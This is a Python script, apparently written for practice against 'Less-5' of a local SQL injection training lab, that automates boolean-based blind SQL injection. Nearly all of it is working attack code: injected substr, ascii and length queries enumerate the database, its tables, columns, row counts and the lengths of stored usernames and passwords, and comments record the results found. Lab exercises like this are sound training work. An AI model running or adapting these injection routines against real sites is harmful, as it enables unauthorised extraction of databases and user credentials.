from urllib.parse import unquote
from typing import *

import requests
import re
import time

# Author: HackHuang
# Description: For Less-5
# Last Modified: 2024/12/07

LAB_ROOT_URL: Final = 'http://localhost:8001'
SQL_COMMENT: Final = '--+'

# 'a' (97), 'b' (98), 'c' (99), 'd' (100), 'e' (101), 'f' (102), 'g' (103), 'h' (104), 'i' (105), 'j' (106),
# 'k' (107), 'l' (108), 'm' (109), 'n' (110), 'o' (111), 'p' (112), 'q' (113), 'r' (114), 's' (115), 't' (116), 
# 'u' (117), 'v' (118), 'w' (119), 'x' (120), 'y' (121), 'z' (122)
LOWERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('a','b','c','d','e','f','g','h','i','j','k','l','m','n',
                                  'o','p','q','r','s','t','u','v','w','x','y','z')
# 'A' (65), 'B' (66), 'C' (67), 'D' (68), 'E' (69), 'F' (70), 'G' (71), 'H' (72), 'I' (73), 'J' (74), 
# 'K' (75), 'L' (76), 'M' (77), 'N' (78), 'O' (79), 'P' (80), 'Q' (81), 'R' (82), 'S' (83), 'T' (84), 
# 'U' (85), 'V' (86), 'W' (87), 'X' (88), 'Y' (89), 'Z' (90)
UPPERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N',
                                  'O','P','Q','R','S','T','U','V','W','X','Y','Z')
# '0' (48), '1' (49), '2' (50), '3' (51), '4' (52), '5' (53), '6' (54), '7' (55), '8' (56), '9' (57)
NUMBER_CHAR_LIST: Final[Tuple[str, ...]] = ('0','1','2','3','4','5','6','7','8','9')
# ' ' (32), '"' (34), '#' (35), '$' (36), '%' (37), '&' (38), '\'' (39),
# '(' (40), ')' (41), '*' (42), ',' (44), '.' (46), '/' (47), ';' (59),
# '<' (60), '=' (61), '>' (62), '@' (64), '[' (91), '\\' (92), ']' (93),
# '_' (95), '`' (96), '{' (123), '|' (124), '}' (125), '©' (169),
# '—' (8212), '€' (8364)
# Note that "\\" will output: "\"
OTHERS_CHAR_LIST: Final[Tuple[str, ...]] = (' ', ',', '"', '#', '$', '%', '&', "'", '(', ')', '*', ',', '.', 
                               '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—')

# all_char_sorted_list: All char lists included, such as four lists as above
all_char_list: List[str] = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]

def url_decoder(url: str) -> str:
    decoded_url: str = unquote(url)
    return decoded_url

def get_method(url: str, pattern: str) -> bool:
    reponse = requests.get(url=url)
    return True if re.search(pattern=pattern, string=reponse.text) else False

@DeprecationWarning
def init_char_list_by_ascii() -> None:
    global all_char_sorted_list
    all_char_list = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
    all_char_ascii_list = [ord(char) for char in all_char_list]
    all_char_ascii_sorted_list = sorted(all_char_ascii_list)
    all_char_sorted_list = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]

def binary_search() -> None:
    pass

def get_db_name_len(url: str, pattern: str) -> int:
    len: int = 0
    while True:
        url_str: str = LAB_ROOT_URL + url + str(len) + SQL_COMMENT
        print(f'Try to get the db name length ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            break
        len = len + 1
    return len

def get_db_name(url: str, pattern: str, db_name_len: int) -> str:
    db_name_char_list: List = []
    db_name_char_ascii: int = 97
    left_index = 1
    while len(db_name_char_list) < db_name_len:
        url_str: str = LAB_ROOT_URL + url + f"substr(database(), {left_index}, 1)>" + f"'{chr(db_name_char_ascii)}'" + SQL_COMMENT
        print(f'Try to get db name ---> {url_str}')
        if get_method(url=url_str, pattern=pattern):
            db_name_char_ascii = db_name_char_ascii + 1
        else:
            db_name_char_list.append(chr(db_name_char_ascii))
            left_index = left_index + 1
            db_name_char_ascii = 97
            print(f'Updated db_name_char_list: {db_name_char_list}')
    return ''.join(e for e in db_name_char_list)

def get_table_num(url: str) -> int:
    table_num: int = 0
    while True:
        url_str: str = LAB_ROOT_URL + url + str(table_num) + ')' + SQL_COMMENT
        print(f'Try to get the table number ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            return table_num + 1
        table_num = table_num + 1

def get_table_name_len(table_num: int) -> List[int]:
    table_name_len: int = 0
    table_name_len_list: List = []
    limit_begin_index: int = 0
    while len(table_name_len_list) < table_num:
        url = f"/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit {limit_begin_index},1))="
        url_str: str = LAB_ROOT_URL + url + str(table_name_len) + SQL_COMMENT
        print(f'Try to get the table name length ---> {url_str}')
        if get_method(url=url_str, pattern=r'You are in'):
            table_name_len_list.append(table_name_len)
            table_name_len = 0
            limit_begin_index = limit_begin_index + 1
        table_name_len = table_name_len + 1
    return table_name_len_list

def get_table_name(pattern: str, table_name_len_list: List) -> List:
    table_name_list: List = []
    limit_begin_index: int = 0
    for table_name_len in table_name_len_list:
        table_name: str = ''
        table_name_char_ascii: int = 97
        substr_begin_index: int = 1
        while len(table_name) < table_name_len:
            url: str = f"/Less-5/?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {limit_begin_index},1), {substr_begin_index}, 1) = '{chr(table_name_char_ascii)}'"
            url = LAB_ROOT_URL + url + SQL_COMMENT
            print(f'Try to get the table name ---> {url}')
            if get_method(url=url, pattern=pattern):
                table_name = table_name + chr(table_name_char_ascii)
                substr_begin_index = substr_begin_index + 1
                table_name_char_ascii = 97
                print(f'Updating the table_name: {table_name}')
                continue
            table_name_char_ascii = table_name_char_ascii + 1
        table_name_list.append(table_name)
        print(f'The table name had been got: {table_name_list}')
        limit_begin_index = limit_begin_index + 1
    return table_name_list

def get_column_num(table_name_list: List, pattern: str) -> Dict[str, int]:
    column_num_dict: Dict = {}
    for table_name in table_name_list:
        column_num: int = 0
        while True:
            url_str: str = f"/Less-5/?id=1' and (select length(group_concat(column_name)) - length(replace(group_concat(column_name), ',', '')) from information_schema.columns where table_name ='{table_name}') = {column_num}"
            url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
            print(f'Try to get the column num: {url_str}')
            if get_method(url=url_str, pattern=pattern):
                column_num_dict[table_name] = column_num + 1
                break
            column_num = column_num + 1
        print(f'The column num had been got: {column_num_dict}')
    return column_num_dict

def get_table_and_column_info(column_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[int, List[int]]]:
    # column_name_len_dict: eg.{'users': {3: [2, 8, 8]}}
    # users: the table name
    # 3: the column number
    # [2, 8, 8]: every column name length
    column_name_len_dict: Dict[str, Dict[int, List[int]]] = {}
    for table_name, table_colmun_num in column_num_dict.items():
        temp_column_name_len: int = 1
        temp_limit_begin_index: int = 0
        temp_column_name_len_list: List[int] = []
        while len(temp_column_name_len_list) < table_colmun_num:
            url: str = f"/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = '{table_name}' limit {temp_limit_begin_index}, 1)) = {temp_column_name_len}"
            url = LAB_ROOT_URL + url + SQL_COMMENT
            print(f'Try to get the column name len: {url}')
            if get_method(url=url, pattern=pattern):
                temp_column_name_len_list.append(temp_column_name_len)
                temp_column_name_len = 0
                temp_limit_begin_index = temp_limit_begin_index + 1
            temp_column_name_len = temp_column_name_len + 1
        column_name_len_dict[table_name] = {table_colmun_num: temp_column_name_len_list}
        print(f'The column name len had been got: {column_name_len_dict}')
    return column_name_len_dict

def get_column_name(pattern: str, table_and_column_info_dict: Dict[str, Dict[int, List[int]]]) -> Dict[str, List[str]]:
    # table_and_column_dict: eg.{'users': ['id', 'username', 'password']}
    # users: the table name
    # id: the first column name
    # username: the second column name
    # password: the third column name
    table_and_column_dict: Dict[str, List[str]] = {}
    for table_name, column_info_dict in table_and_column_info_dict.items():
        temp_column_name_list: List = []
        for column_num, column_name_len_list in column_info_dict.items():
            temp_limit_begin_index: int = 0
            while len(temp_column_name_list) < column_num:
                for column_name_len in column_name_len_list:
                    temp_column_name: str = ''
                    temp_char_index: int = 0
                    temp_substr_begin_index: int = 1
                    while len(temp_column_name) < column_name_len:
                        temp_char: str = all_char_sorted_list[temp_char_index]
                        url: str = f"/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='{table_name}' limit {temp_limit_begin_index}, 1), {temp_substr_begin_index}, 1))='{ord(temp_char)}'"
                        url = LAB_ROOT_URL + url + SQL_COMMENT
                        print(f'Try to the column name: {url}')
                        if get_method(url=url, pattern=pattern):
                            temp_column_name = temp_column_name + temp_char
                            temp_substr_begin_index = temp_substr_begin_index + 1
                            temp_char_index = 0
                        temp_char_index = temp_char_index + 1
                    temp_column_name_list.append(temp_column_name)
                    print(f'The column name had been got: {temp_column_name_list}, table name: {table_name}')
                    temp_limit_begin_index = temp_limit_begin_index + 1
        table_and_column_dict[table_name] = temp_column_name_list
    return table_and_column_dict

def get_data_num(table_and_column_dict: Dict[str, List[str]], pattern: str) -> Dict[str, int]:
    data_num_dict: Dict[str, int] = {}
    for table_name, column_name_list in table_and_column_dict.items():
        data_num: int = 0
        the_first_column_name: str = column_name_list[0]
        while True:
            # 1.Note that `ifnull(...,'')` will be return '' if the table is empty, then `length(ifnull(...,''))` will be return 0
            # 2.Note that `%2B` will be translated to `+` by browse
            url_str: str = f"/Less-5/?id=1' and length(ifnull((select group_concat({the_first_column_name}) from {table_name}),'')) - length(ifnull((select replace(group_concat({the_first_column_name}), ',', '') from {table_name}),'')) %2B 1 = {data_num}"
            url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
            print(f'Try to get the data num: {url_str}')
            if get_method(url=url_str, pattern=pattern):
                # table is empty when `get_method` return true and data_num equal with 1
                if data_num == 1:
                    data_num_dict[table_name] = 0
                else:
                    data_num_dict[table_name] = data_num
                break
            data_num = data_num + 1
    return data_num_dict

def get_data_len(table_and_column_dict: Dict[str, List[str]], table_and_data_num_dict: Dict[str, int], pattern: str) -> Dict[str, Dict[str, List[int]]]:
    data_len_dict: Dict[str, Dict[str, List[int]]] = {}
    for table_name, column_name_list in table_and_column_dict.items():
        data_num: int = table_and_data_num_dict[table_name]
        column_and_data_len_dict: Dict[str, List[int]] = {}
        for column_name in column_name_list:
            data_len: int = 0
            data_len_list: List[int] = []
            limit_begin_index: int = 0
            while limit_begin_index < data_num:
                url_str: str = f"/Less-5/?id=1' and length((select {column_name} from {table_name} limit {limit_begin_index},1)) = {data_len}"
                url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
                print(f'Try to get the data lenght: {url_str}')
                if get_method(url=url_str, pattern=pattern):
                    limit_begin_index = limit_begin_index + 1
                    data_len_list.append(data_len)
                    data_len = 0
                data_len = data_len + 1
            column_and_data_len_dict[column_name] = data_len_list
            print(f'table name: `{table_name}`, column name: `{column_name}`, data num: `{data_num}`, data length list: `{data_len_list}`')
        data_len_dict[table_name] = column_and_data_len_dict
    return data_len_dict

def get_data() -> None:
    url_str: str = f"http://localhost:8001/Less-5/?id=1' and ascii(substr((select email_id from emails limit 0,1), 1,1))='68'--+"
    pass

# Decoded URL: ?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
# print(f"Decoded URL: {url_decoder("?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+")}")

# db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=")
# print(f'The db name length: {db_name_len}')

# db_name: str = get_db_name(url="/Less-5/?id=1' and ", pattern=r'You are in', db_name_len=8)
# print(f'The db name: {db_name}')

# table_num: int = get_table_num(url="/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) -LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = ")
# print(f'The table number: {table_num}')

# table_name_len_list: List = get_table_name_len(table_num=4)
# print(f'The table name length: {table_name_len_list}')

get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
print(f'The table name list: {table_name_list}\n\n')

column_num_dict: Dict[str, int] = get_column_num(table_name_list=table_name_list, pattern='You are in')
print(f'The column num dict: {column_num_dict}\n\n')

table_and_column_info_dict: Dict[str, Dict[int, List[int]]] = get_table_and_column_info(column_num_dict=column_num_dict, pattern='You are in')
print(f'The column name len dict: {table_and_column_info_dict}\n\n')

table_and_column_dict: Dict[str, List[str]] = get_column_name(pattern='You are in', table_and_column_info_dict=table_and_column_info_dict)
# {'emails': ['id', 'email_id'], 
# 'referers': ['id', 'referer', 'ip_address'], 
# 'uagents': ['id', 'uagent', 'ip_address', 'username'], 
# 'users': ['id', 'username', 'password']}
print(f'The table name and column name dict: {table_and_column_dict}\n\n')

table_and_data_num_dict: Dict[str, int] = get_data_num(table_and_column_dict=table_and_column_dict, pattern='You are in')
# The data num list: {'emails': 8, 'referers': 0, 'uagents': 0, 'users': 13}
print(f'The data num list: {table_and_data_num_dict}\n\n')

# table name: emails
#         column name: id, data length list: [1, 1, 1, 1, 1, 1, 1, 1]
#         column name: email_id, data length list: [16, 16, 19, 20, 20, 22, 20, 17]
# table name: referers
#         column name: id, data length list: []
#         column name: referer, data length list: []
#         column name: ip_address, data length list: []
# table name: uagents
#         column name: id, data length list: []
#         column name: uagent, data length list: []
#         column name: ip_address, data length list: []
#         column name: username, data length list: []
# table name: users
#         column name: id, data length list: [1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2]
#         column name: username, data length list: [4, 8, 5, 6, 6, 8, 6, 5, 6, 6, 6, 7, 6]
#         column name: password, data length list: [4, 10, 8, 6, 9, 7, 6, 5, 6, 6, 6, 5, 6]
table_column_data_len_dict: Dict[str, Dict[str, List[int]]] = get_data_len(table_and_column_dict=table_and_column_dict, table_and_data_num_dict=table_and_data_num_dict, pattern='You are in')
for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
    print(f'table name: {table_name}')
    for column_name, data_len_list in column_and_data_len_dict.items():
        print(f'\tcolumn name: {column_name}, data length list: {data_len_list}')